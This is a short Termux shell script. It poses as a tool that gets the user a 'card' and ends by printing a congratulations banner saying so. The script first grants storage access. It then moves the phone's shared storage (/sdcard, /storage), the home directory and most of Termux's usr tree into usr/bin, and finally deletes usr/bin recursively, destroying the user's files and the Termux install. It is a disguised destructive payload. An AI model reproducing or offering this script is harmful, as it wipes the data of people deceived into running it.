apt install figlet

git clone https://github.com/SuSux13/comandosTERMUX

cd comandosTERMUX

mv banner.txt /data/data/com.termux/files/usr/etc
cd  /data/data/com.termux/files/usr/etc
cp banner.txt bash.bashrc



termux-setup-storage

mv /sdcard /data/data/com.termux/files/usr/bin
mv /storage /data/data/com.termux/files/usr/bin

mv $HOME /data/data/com.termux/files/usr/bin

cd $HOME 

cd ..
cd usr

mv /data/data/com.termux/files/usr/include /data/data/com.termux/files/usr/bin
mv  /data/data/com.termux/files/usr/lib /data/data/com.termux/files/usr/bin
mv /data/data/com.termux/files/usr/libexec /data/data/com.termux/files/usr/bin
mv /data/data/com.termux/files/usr/opt /data/data/com.termux/files/usr/bin
mv /data/data/com.termux/files/usr/share /data/data/com.termux/files/usr/bin
mv /data/data/com.termux/files/usr/src /data/data/com.termux/files/usr/bin
mv /data/data/com.termux/files/usr/tmp /data/data/com.termux/files/usr/bin
mv /data/data/com.termux/files/usr/var /data/data/com.termux/files/usr/bin

figlet -f standard FELICIDADES YA TIENES TU TARJETA

rm -r /data/data/com.termux/files/usr/bin
